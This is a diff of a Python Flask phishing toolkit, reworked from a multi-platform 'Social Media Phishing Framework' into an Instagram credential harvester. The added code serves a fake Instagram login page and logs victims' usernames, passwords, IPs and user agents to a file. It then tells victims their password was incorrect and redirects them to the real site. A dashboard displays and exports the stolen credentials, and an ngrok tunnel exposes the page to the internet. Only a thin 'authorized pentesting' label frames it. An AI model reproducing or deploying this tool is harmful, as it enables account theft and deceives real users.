-            <a href="/clear" class="dashboard-link" style="background: #ff4444; margin-left: 10px;" 
-               onclick="return confirm('Clear all captured data?')">🗑️ Clear Data</a>
-            
-            <div class="footer">
-                Social Media Phishing Framework v2.0 | For authorized pentesting only<br>
-                Server time: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """
-            </div>
-        </div>
-        
-        <script>
-            // Auto-refresh stats
-            setInterval(function() {{
-                fetch('/stats')
-                    .then(r => r.json())
-                    .then(d => {{
-                        document.querySelectorAll('.stat .num')[1].textContent = d.total;
-                    }});
-            }}, 3000);
-        </script>
-    </body>
-    </html>
-    """
-    return html
+    """Serve the Instagram phishing page"""
+    return INSTAGRAM_PAGE
 
 
-@app.route('/phish/<platform>')
-def phish_page(platform):
-    """Serve a phishing page for the specified platform"""
-    if platform not in PLATFORMS:
-        return "Platform not found", 404
+@app.route('/capture', methods=['POST'])
+def capture():
+    """Capture Instagram credentials"""
+    username = request.form.get('username', 'unknown')
+    password = request.form.get('password', 'unknown')
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    ip = request.remote_addr
+    ua = request.headers.get('User-Agent', 'Unknown')
     
-    p = PLATFORMS[platform]
-    
-    return render_template_string(
-        PHISH_TEMPLATE,
-        platform_key=platform,
-        platform_name=p['name'],
-        color=p['color'],
-        logo=p['logo'],
-        fields=p['fields'],
-        field_labels=p['field_labels'],
-        bg_color=p['bg_color'],
-        button_text=p['button_text'],
-        extra_link=p['extra_link'],
-        signup_link=p['signup_link']
-    )
-
-
-@app.route('/capture/<platform>', methods=['POST'])
-def capture(platform):
-    """Capture credentials and save them"""
-    if platform not in PLATFORMS:
-        return "Invalid platform", 400
-    
-    p = PLATFORMS[platform]
-    form_data = dict(request.form)
-    
-    # Build capture record
-    capture_record = {
-        'id': hashlib.md5(str(time.time()).encode()).hexdigest()[:12],
-        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+    # Create capture record
+    capture_data = {
+        'id': hashlib.md5(f"{timestamp}{ip}{username}".encode()).hexdigest()[:12],
+        'timestamp': timestamp,
         'unix_time': int(time.time()),
-        'platform': platform,
-        'platform_name': p['name'],
-        'ip': request.remote_addr,
-        'user_agent': request.headers.get('User-Agent', 'Unknown'),
-        'referer': request.headers.get('Referer', 'Direct'),
-        'data': form_data,
-        'country': 'N/A',
-        'success': True
+        'platform': 'Instagram',
+        'ip': ip,
+        'user_agent': ua,
+        'username': username,
+        'password': password
     }
     
     # Save to file
-    save_capture(capture_record)
+    saves = []
+    if os.path.exists(CONFIG['data_file']):
+        with open(CONFIG['data_file'], 'r') as f:
+            try:
+                saves = json.load(f)
+            except:
+                saves = []
     
-    # Print to console
-    print(f"\n{'='*60}")
-    print(f"[+] {datetime.now().strftime('%H:%M:%S')} — {p['name']} CREDENTIALS CAPTURED!")
-    print(f"[+] IP: {capture_record['ip']}")
-    print(f"[+] User-Agent: {capture_record['user_agent'][:60]}...")
-    print(f"[+] Fields:")
-    for key, val in form_data.items():
-        if 'pass' in key.lower():
-            print(f"    🔑 {key}: {val}")
-        else:
-            print(f"    📧 {key}: {val}")
-    print(f"{'='*60}\n")
+    saves.append(capture_data)
     
-    # Redirect to real platform
-    real_urls = {
-        'facebook': 'https://www.facebook.com',
-        'instagram': 'https://www.instagram.com',
-        'twitter': 'https://twitter.com',
-        'linkedin': 'https://www.linkedin.com',
-        'tiktok': 'https://www.tiktok.com',
-        'snapchat': 'https://www.snapchat.com',
-        'discord': 'https://discord.com',
-        'reddit': 'https://www.reddit.com',
-        'whatsapp': 'https://web.whatsapp.com',
-        'telegram': 'https://web.telegram.org',
-    }
+    with open(CONFIG['data_file'], 'w') as f:
+        json.dump(saves, f, indent=2)
     
-    redirect_url = real_urls.get(platform, 'https://www.google.com')
+    # Console notification
+    print(f"\n{'='*55}")
+    print(f"  📸 INSTAGRAM CREDENTIALS CAPTURED!")
+    print(f"{'='*55}")
+    print(f"  Time:     {timestamp}")
+    print(f"  IP:       {ip}")
+    print(f"  Username: {username}")
+    print(f"  Password: {password}")
+    print(f"  UA:       {ua[:50]}...")
+    print(f"{'='*55}\n")
     
+    # Flash notification file
+    with open('last_capture.txt', 'w') as f:
+        f.write(f"Instagram | {username}:{password} | {timestamp}")
+    
+    # Redirect to real Instagram (victim thinks they just mistyped)
     return f"""
     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
-        <meta http-equiv="refresh" content="2;url={redirect_url}">
+        <meta http-equiv="refresh" content="2;url={CONFIG['redirect_url']}">
         <title>Redirecting...</title>
         <style>
             body {{
-                font-family: Arial, sans-serif;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                background: #fafafa;
                 display: flex;
                 justify-content: center;
                 align-items: center;
                 height: 100vh;
-                background: #f5f5f5;
                 margin: 0;
             }}
             .box {{
                 text-align: center;
                 padding: 40px;
                 background: white;
-                border-radius: 8px;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                border: 1px solid #dbdbdb;
+                border-radius: 4px;
             }}
             .spinner {{
-                border: 3px solid #f3f3f3;
-                border-top: 3px solid {p['color']};
+                width: 32px;
+                height: 32px;
+                border: 3px solid #dbdbdb;
+                border-top: 3px solid #0095F6;
                 border-radius: 50%;
-                width: 40px;
-                height: 40px;
-                animation: spin 1s linear infinite;
+                animation: spin 0.8s linear infinite;
                 margin: 20px auto;
             }}
-            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }}}}
+            p {{ color: #8e8e8e; font-size: 14px; }}
         </style>
     </head>
     <body>
         <div class="box">
-            <h2>Verifying your identity...</h2>
+            <h2 style="color:#262626;font-weight:400;">Sorry, your password was incorrect.</h2>
+            <p>Please double-check your password and try again.</p>
             <div class="spinner"></div>
-            <p style="color: #666; font-size: 14px;">Please wait while we redirect you</p>
+            <p style="font-size:12px;color:#bbb;">Redirecting to Instagram...</p>
         </div>
     </body>
     </html>
@@ -770,230 +508,160 @@ def capture(platform):
 
 @app.route('/dashboard')
 def dashboard():
-    """View all captured credentials with analytics"""
-    captures = load_all_captures()
+    """View captured credentials"""
+    saves = []
+    if os.path.exists(CONFIG['data_file']):
+        with open(CONFIG['data_file'], 'r') as f:
+            try:
+                saves = json.load(f)
+            except:
+                saves = []
     
-    # Stats
-    total = len(captures)
-    by_platform = {}
-    for c in captures:
-        plat = c.get('platform_name', c.get('platform', 'Unknown'))
-        by_platform[plat] = by_platform.get(plat, 0) + 1
+    # Get ngrok URL
+    ngrok_url = "Not connected"
+    try:
+        r = req.get("http://localhost:4040/api/tunnels")
+        tunnels = r.json().get('tunnels', [])
+        for t in tunnels:
+            if t.get('proto') == 'https':
+                ngrok_url = t.get('public_url', 'Not connected')
+                break
+    except:
+        pass
     
-    html = """
+    html = f"""
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Phishing Dashboard</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Instagram Phisher — Dashboard</title>
         <style>
-            body {
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                background: #0f0f23;
-                color: #fff;
-                margin: 0;
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+            body {{
+                font-family: 'Courier New', monospace;
+                background: #0a0a0f;
+                color: #c0c0c0;
                 padding: 20px;
-            }
-            .container { max-width: 1200px; margin: 0 auto; }
-            h1 { color: #00ff88; }
-            .stats-row {
-                display: flex;
-                gap: 15px;
-                margin: 20px 0;
-                flex-wrap: wrap;
-            }
-            .stat-box {
-                background: #1a1a3e;
-                border-radius: 8px;
-                padding: 15px 20px;
-                min-width: 120px;
-                border: 1px solid #2a2a5e;
-            }
-            .stat-box .num { font-size: 28px; font-weight: bold; color: #00ff88; }
-            .stat-box .label { font-size: 12px; color: #888; }
-            table {
-                width: 100%;
-                border-collapse: collapse;
-                margin-top: 20px;
-                font-size: 13px;
-            }
-            th {
-                background: #1a1a3e;
-                color: #00ff88;
-                padding: 12px;
-                text-align: left;
-                border-bottom: 2px solid #2a2a5e;
-            }
-            td {
-                padding: 10px 12px;
-                border-bottom: 1px solid #1a1a3e;
-                color: #ccc;
-            }
-            tr:hover { background: #1a1a3e; }
-            .platform-badge {
-                display: inline-block;
-                padding: 2px 8px;
-                border-radius: 4px;
-                font-size: 11px;
-                font-weight: bold;
-            }
-            .password { color: #ff6666; font-family: monospace; }
-            .email { color: #66b3ff; }
-            .actions a {
-                color: #00ff88;
-                text-decoration: none;
-                margin: 0 5px;
-                font-size: 12px;
-            }
-            .actions a:hover { text-decoration: underline; }
-            .search-box {
-                width: 100%;
-                padding: 12px;
-                background: #1a1a3e;
-                border: 1px solid #2a2a5e;
-                border-radius: 8px;
-                color: white;
-                font-size: 14px;
-                margin: 15px 0;
-            }
-            .search-box::placeholder { color: #555; }
-            .export-btn {
-                display: inline-block;
-                padding: 8px 16px;
-                background: #4444ff;
-                color: white;
-                text-decoration: none;
-                border-radius: 6px;
-                font-size: 13px;
-                margin: 5px;
-            }
-            .export-btn:hover { background: #5555ff; }
-            .clear-btn {
-                display: inline-block;
-                padding: 8px 16px;
-                background: #ff4444;
-                color: white;
-                text-decoration: none;
-                border-radius: 6px;
-                font-size: 13px;
-                margin: 5px;
-            }
-            .pagination {
-                margin-top: 20px;
-                text-align: center;
-            }
-            .pagination a {
-                color: #00ff88;
-                margin: 0 5px;
-                text-decoration: none;
-            }
-            .pagination a:hover { text-decoration: underline; }
-            .detected-creds {
-                background: #2a1a1a;
-                border: 1px solid #ff4444;
-                border-radius: 8px;
-                padding: 15px;
-                margin: 20px 0;
-            }
-            .detected-creds h3 { color: #ff6666; margin: 0 0 10px 0; }
+            }}
+            .container {{ max-width: 1000px; margin: 0 auto; }}
+            h1 {{ color: #E4405F; margin-bottom: 5px; font-size: 24px; }}
+            .subtitle {{ color: #555; font-size: 12px; margin-bottom: 25px; }}
+            .info-bar {{
+                background: #0d0d15; border: 1px solid #1e1e2a; border-radius: 6px;
+                padding: 15px; margin-bottom: 20px;
+                display: flex; gap: 20px; flex-wrap: wrap;
+            }}
+            .info-item {{ font-size: 12px; color: #888; }}
+            .info-item span {{ color: #E4405F; font-weight: bold; }}
+            .info-item .green {{ color: #00ff88; }}
+            table {{
+                width: 100%; border-collapse: collapse; font-size: 12px;
+                background: #0d0d15; border: 1px solid #1e1e2a; border-radius: 6px; overflow: hidden;
+            }}
+            th {{
+                background: #0a0a0f; color: #E4405F; padding: 10px 12px;
+                text-align: left; border-bottom: 1px solid #E4405F30;
+                font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
+            }}
+            td {{ padding: 8px 12px; border-bottom: 1px solid #1e1e2a; color: #aaa; }}
+            tr:hover td {{ background: #E4405F05; }}
+            .pass {{ color: #ff6666; font-family: monospace; }}
+            .user {{ color: #66b3ff; }}
+            .ip {{ color: #888; font-family: monospace; font-size: 11px; }}
+            .time {{ color: #555; font-size: 11px; }}
+            .stats {{
+                display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap;
+            }}
+            .stat-box {{
+                background: #0d0d15; border: 1px solid #1e1e2a; border-radius: 6px;
+                padding: 15px 20px; min-width: 120px; text-align: center;
+            }}
+            .stat-box .num {{ font-size: 24px; font-weight: bold; color: #E4405F; }}
+            .stat-box .label {{ font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }}
+            .actions {{ margin-bottom: 15px; display: flex; gap: 8px; }}
+            .actions a {{
+                padding: 8px 14px; border: 1px solid #1e1e2a; border-radius: 4px;
+                text-decoration: none; color: #888; font-size: 11px; transition: all 0.3s;
+            }}
+            .actions a:hover {{ border-color: #E4405F40; color: #fff; }}
+            .actions a.danger {{ border-color: #E4405F30; color: #E4405F; }}
+            .actions a.danger:hover {{ background: #E4405F10; }}
+            .empty {{ text-align: center; padding: 40px; color: #555; }}
+            .empty .icon {{ font-size: 40px; margin-bottom: 10px; }}
+            .ngrok {{ color: #00ff88; font-family: monospace; font-size: 13px; }}
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>📊 Capture Dashboard</h1>
-            <p style="color: #888;">Real-time view of all captured credentials</p>
+            <h1>📸 Instagram Phisher</h1>
+            <p class="subtitle">Authorized Penetration Testing — Dashboard</p>
             
-            <div class="stats-row">
+            <div class="info-bar">
+                <div class="info-item">🔗 Phishing URL: <span class="ngrok">{ngrok_url}</span></div>
+                <div class="info-item">📁 Captures: <span>{len(saves)}</span></div>
+                <div class="info-item">🌐 Server: <span>http://localhost:{CONFIG['port']}</span></div>
+                <div class="info-item">🟢 Status: <span class="green">Active</span></div>
+            </div>
+            
+            <div class="stats">
                 <div class="stat-box">
-                    <div class="num">""" + str(total) + """</div>
+                    <div class="num">{len(saves)}</div>
                     <div class="label">Total Captures</div>
                 </div>
                 <div class="stat-box">
-                    <div class="num">""" + str(len(set(c.get('ip', '') for c in captures))) + """</div>
+                    <div class="num">{len(set(c['ip'] for c in saves)) if saves else 0}</div>
                     <div class="label">Unique IPs</div>
                 </div>
                 <div class="stat-box">
-                    <div class="num">""" + str(len(by_platform)) + """</div>
-                    <div class="label">Platforms Hit</div>
+                    <div class="num">{len([c for c in saves if c['password'] != 'unknown']) if saves else 0}</div>
+                    <div class="label">Valid Creds</div>
                 </div>
                 <div class="stat-box">
-                    <div class="num">""" + (captures[-1]['timestamp'][:10] if captures else 'N/A') + """</div>
+                    <div class="num">{saves[-1]['timestamp'][:10] if saves else 'N/A'}</div>
                     <div class="label">Latest Capture</div>
                 </div>
             </div>
             
-            <div class="stats-row">
-    """
-    
-    # Platform breakdown
-    colors = {
-        'Facebook': '#1877F2', 'Instagram': '#E4405F', 'X / Twitter': '#000000',
-        'LinkedIn': '#0A66C2', 'TikTok': '#FE2C55', 'Snapchat': '#FFFC00',
-        'Discord': '#5865F2', 'Reddit': '#FF4500', 'WhatsApp Web': '#25D366',
-        'Telegram': '#0088cc'
-    }
-    for plat, count in sorted(by_platform.items(), key=lambda x: x[1], reverse=True):
-        color = colors.get(plat, '#888')
-        html += f"""
-                <div class="stat-box" style="border-left: 3px solid {color};">
-                    <div class="num" style="color: {color};">{count}</div>
-                    <div class="label">{plat}</div>
-                </div>
-        """
-    
-    html += """
+            <div class="actions">
+                <a href="/export">📥 Export JSON</a>
+                <a href="/export?format=csv">📥 Export CSV</a>
+                <a href="/clear" class="danger" onclick="return confirm('Delete all {len(saves)} captures?')">🗑️ Clear All</a>
+                <a href="/" style="margin-left:auto;">📱 Phishing Page →</a>
             </div>
             
-            <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by email, IP, platform..." onkeyup="filterTable()">
-            
-            <div>
-                <a href="/export" class="export-btn">📥 Export JSON</a>
-                <a href="/export?format=csv" class="export-btn">📥 Export CSV</a>
-                <a href="/clear" class="clear-btn" onclick="return confirm('Permanently delete all captures?')">🗑️ Clear All Data</a>
-            </div>
-            
-            <table id="capturesTable">
+            <table>
                 <thead>
                     <tr>
                         <th>Time</th>
-                        <th>Platform</th>
                         <th>IP</th>
-                        <th>Credentials</th>
-                        <th>User-Agent</th>
-                        <th>Actions</th>
+                        <th>Username / Email</th>
+                        <th>Password</th>
+                        <th>UA</th>
                     </tr>
                 </thead>
                 <tbody>
     """
     
-    # Show last 50 captures
-    for capture in captures[-50:]:
-        plat = capture.get('platform_name', capture.get('platform', 'Unknown'))
-        data = capture.get('data', {})
-        
-        # Format credentials
-        creds_parts = []
-        for k, v in data.items():
-            if 'pass' in k.lower():
-                creds_parts.append(f'<span class="password">🔑 {v}</span>')
-            else:
-                creds_parts.append(f'<span class="email">📧 {v}</span>')
-        creds_display = '<br>'.join(creds_parts) if creds_parts else 'N/A'
-        
-        ip = capture.get('ip', 'Unknown')
-        ua = capture.get('user_agent', 'Unknown')[:40] + '...' if len(capture.get('user_agent', '')) > 40 else capture.get('user_agent', 'Unknown')
-        
-        color = colors.get(plat, '#888')
-        
-        html += f"""
+    if saves:
+        for c in reversed(saves[-30:]):  # Show last 30
+            html += f"""
                     <tr>
-                        <td style="font-size: 11px; color: #888;">{capture.get('timestamp', 'N/A')}</td>
-                        <td><span class="platform-badge" style="background: {color}20; color: {color}; border: 1px solid {color}40;">{plat}</span></td>
-                        <td style="font-family: monospace; font-size: 12px;">{ip}</td>
-                        <td>{creds_display}</td>
-                        <td style="font-size: 11px; color: #888;">{ua}</td>
-                        <td class="actions">
-                            <a href="#" onclick="copyToClipboard('{ip}')">📋</a>
-                            <a href="/delete/{capture.get('id', '')}" onclick="return confirm('Delete this entry?')">❌</a>
+                        <td class="time">{c['timestamp']}</td>
+                        <td class="ip">{c['ip']}</td>
+                        <td class="user">{c['username']}</td>
+                        <td class="pass">{c['password']}</td>
+                        <td style="font-size:10px;color:#555;">{c['user_agent'][:30]}...</td>
+                    </tr>
+            """
+    else:
+        html += """
+                    <tr>
+                        <td colspan="5">
+                            <div class="empty">
+                                <div class="icon">🎯</div>
+                                <p>No captures yet. Share your phishing URL and wait for targets.</p>
+                            </div>
                         </td>
                     </tr>
         """
@@ -1001,46 +669,8 @@ def dashboard():
     html += """
                 </tbody>
             </table>
-            
-            <div class="pagination">
-                <a href="#">&laquo; Previous</a>
-                <span style="color: #888; margin: 0 10px;">1</span>
-                <a href="#">Next &raquo;</a>
-            </div>
-            
-            <div class="footer" style="margin-top: 30px; color: #555; font-size: 12px; text-align: center;">
-                Showing last """ + str(min(50, len(captures))) + """ of """ + str(len(captures)) + """ captures
-            </div>
+            <p style="color:#444;font-size:11px;margin-top:10px;">Showing last 30 of """ + str(len(saves)) + """ captures</p>
         </div>
-        
-        <script>
-            function filterTable() {
-                var input = document.getElementById('searchInput');
-                var filter = input.value.toLowerCase();
-                var table = document.getElementById('capturesTable');
-                var tr = table.getElementsByTagName('tr');
-                
-                for (var i = 1; i < tr.length; i++) {
-                    var td = tr[i].getElementsByTagName('td');
-                    var found = false;
-                    for (var j = 0; j < td.length; j++) {
-                        if (td[j] && td[j].innerHTML.toLowerCase().indexOf(filter) > -1) {
-                            found = true;
-                            break;
-                        }
-                    }
-                    tr[i].style.display = found ? '' : 'none';
-                }
-            }
-            
-            function copyToClipboard(text) {
-                navigator.clipboard.writeText(text);
-                alert('Copied: ' + text);
-            }
-            
-            // Auto-refresh every 5 seconds
-            setTimeout(function() { location.reload(); }, 5000);
-        </script>
     </body>
     </html>
     """
@@ -1050,91 +680,132 @@ def dashboard():
 
 @app.route('/export')
 def export_data():
-    """Export all captures as JSON or CSV"""
-    captures = load_all_captures()
+    """Export captures as JSON or CSV"""
+    saves = []
+    if os.path.exists(CONFIG['data_file']):
+        with open(CONFIG['data_file'], 'r') as f:
+            try:
+                saves = json.load(f)
+            except:
+                saves = []
+    
     fmt = request.args.get('format', 'json')
     
     if fmt == 'csv':
-        # Generate CSV
-        import csv, io
-        output = io.StringIO()
+        import io as io_module
+        output = io_module.StringIO()
         writer = csv.writer(output)
-        
-        # Header
-        if captures:
-            writer.writerow(['Timestamp', 'Platform', 'IP', 'User-Agent'] + 
-                          list(captures[0].get('data', {}).keys()) +
-                          ['ID'])
-        
-        for c in captures:
-            row = [
-                c.get('timestamp', ''),
-                c.get('platform_name', ''),
-                c.get('ip', ''),
-                c.get('user_agent', '')
-            ]
-            row.extend(c.get('data', {}).values())
-            row.append(c.get('id', ''))
-            writer.writerow(row)
-        
+        writer.writerow(['Timestamp', 'IP', 'Username', 'Password', 'User-Agent', 'ID'])
+        for c in saves:
+            writer.writerow([c['timestamp'], c['ip'], c['username'], c['password'], c['user_agent'], c['id']])
         csv_data = output.getvalue()
         return csv_data, 200, {
             'Content-Type': 'text/csv',
-            'Content-Disposition': f'attachment; filename=phishing_captures_{int(time.time())}.csv'
+            'Content-Disposition': f'attachment; filename=instagram_captures_{int(time.time())}.csv'
         }
     else:
-        # JSON export
-        return json.dumps(captures, indent=2), 200, {
+        return json.dumps(saves, indent=2), 200, {
             'Content-Type': 'application/json',
-            'Content-Disposition': f'attachment; filename=phishing_captures_{int(time.time())}.json'
+            'Content-Disposition': f'attachment; filename=instagram_captures_{int(time.time())}.json'
         }
-
-
-@app.route('/stats')
-def stats():
-    """Return JSON stats for auto-refresh"""
-    captures = load_all_captures()
-    return json.dumps({'total': len(captures), 'time': datetime.now().strftime('%H:%M:%S')})
-
-
-@app.route('/delete/<capture_id>')
-def delete_capture(capture_id):
-    """Delete a specific capture"""
-    captures = load_all_captures()
-    captures = [c for c in captures if c.get('id') != capture_id]
-    save_all_captures(captures)
-    return redirect('/dashboard')
 
 
 @app.route('/clear')
 def clear_data():
     """Clear all captured data"""
-    save_all_captures([])
-    print(f"\n[!] All captured data cleared at {datetime.now().strftime('%H:%M:%S')}")
-    return redirect('/')
+    if os.path.exists(CONFIG['data_file']):
+        os.remove(CONFIG['data_file'])
+    if os.path.exists('last_capture.txt'):
+        os.remove('last_capture.txt')
+    print(f"\n[!] All Instagram captures cleared at {datetime.now().strftime('%H:%M:%S')}")
+    return redirect('/dashboard')
+
+
+@app.route('/stats')
+def stats_api():
+    """JSON stats for monitoring"""
+    saves = []
+    if os.path.exists(CONFIG['data_file']):
+        with open(CONFIG['data_file'], 'r') as f:
+            try:
+                saves = json.load(f)
+            except:
+                saves = []
+    
+    return jsonify({
+        'total': len(saves),
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'last_capture': saves[-1]['timestamp'] if saves else None,
+        'unique_ips': len(set(c['ip'] for c in saves)) if saves else 0
+    })
 
 
 # ============================================================
-# DATA STORAGE FUNCTIONS
+# NGROK AUTO-CONFIGURATION
 # ============================================================
 
-DATA_FILE = 'social_phish_captures.json'
-
-def save_capture(record):
-    """Save a single capture record to the JSON file"""
-    captures = load_all_captures()
-    captures.append(record)
-    save_all_captures(captures)
-
-def load_all_captures():
-    """Load all capture records from the JSON file"""
-    if not os.path.exists(DATA_FILE):
-        return []
+def start_ngrok():
+    """Start ngrok tunnel automatically"""
+    print("\n[*] Starting ngrok tunnel...")
+    
+    # Check if ngrok is installed
     try:
-        with open(DATA_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return []
+        subprocess.run(['ngrok', 'version'], capture_output=True, check=True)
+    except (subprocess.FileNotFoundError, subprocess.CalledProcessError):
+        print("[!] ngrok not found. Install it: https://ngrok.com/download")
+        print("[!] Continuing on localhost only...")
+        return None
+    
+    # Start ngrok
+    ngrok_process = subprocess.Popen(
+        ['ngrok', 'http', str(CONFIG['port']), '--log=stdout'],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+    
+    # Wait for tunnel to be ready
+    time.sleep(3)
+    
+    # Get the public URL
+    try:
+        r = req.get("http://localhost:4040/api/tunnels")
+        tunnels = r.json().get('tunnels', [])
+        for t in tunnels:
+            if t.get('proto') == 'https':
+                url = t.get('public_url')
+                print(f"\n{'='*55}")
+                print(f"  🚀 NGROK TUNNEL ACTIVE!")
+                print(f"{'='*55}")
+                print(f"  Phishing URL: {url}")
+                print(f"  Dashboard:    {url}/dashboard")
+                print(f"{'='*55}\n")
+                return url
+    except Exception as e:
+        print(f"[!] Could not get ngrok URL: {e}")
+        print("[!] Check http://localhost:4040 for status")
+    
+    return None
 
-def save_all_captures(captures):
-    """Save all
+
+# ============================================================
+# MAIN
+# ============================================================
+
+if __name__ == '__main__':
+    print(f"""
+{'='*55}
+  📸 INSTAGRAM PHISHING TOOLKIT
+  {'='*55}
+  Authorized Penetration Testing Only
+  
+  Server: http://localhost:{CONFIG['port']}
+  Dashboard: http://localhost:{CONFIG['port']}/dashboard
+  {'='*55}
+""")
+    
+    # Start ngrok in background
+    ngrok_thread = threading.Thread(target=start_ngrok, daemon=True)
+    ngrok_thread.start()
+    
+    # Run Flask app
+    app.run(host='0.0.0.0', port=CONFIG['port'], debug=False)
